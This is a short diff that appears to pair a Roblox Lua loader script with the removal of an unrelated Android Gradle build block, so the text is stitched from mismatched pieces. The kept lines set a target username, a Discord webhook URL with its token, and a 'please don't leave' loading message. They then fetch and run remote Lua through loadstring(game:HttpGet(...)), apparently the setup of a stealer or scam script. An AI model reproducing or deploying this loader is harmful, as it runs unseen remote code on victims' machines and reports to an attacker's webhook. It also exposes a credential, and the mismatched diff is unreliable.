@@ -2,24 +2,3 @@ _G.Name user= "omgchuakia123"
 _G.HubName = "Blacktrap script are loading, please don't leave"
 _G.WebhookUrl = "discord.com/api/webhooks/1107319474945798144/OD_Za12hB0_V29E3yHmHBgRCsbNkovHPB9fJpHZAnTYZsSnRfKQfmjA_cSfAeo7jzZ58"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
-android {
-    buildTypes {
-        release {
-            // Enables code shrinking, obfuscation, and optimization for only
-            // your project's release build type.
-            minifyEnabled true
-
-            // Enables resource shrinking, which is performed by the
-            // Android Gradle plugin.
-            shrinkResources true
-
-            // Includes the default ProGuard rules files that are packaged with
-            // the Android Gradle plugin. To learn more, go to the section about
-            // R8 configuration files.
-            proguardFiles getDefaultProguardFile(
-                    'proguard-android-optimize.txt'),
-                    'proguard-rules.pro'
-        }
-    }
-    ...
-}
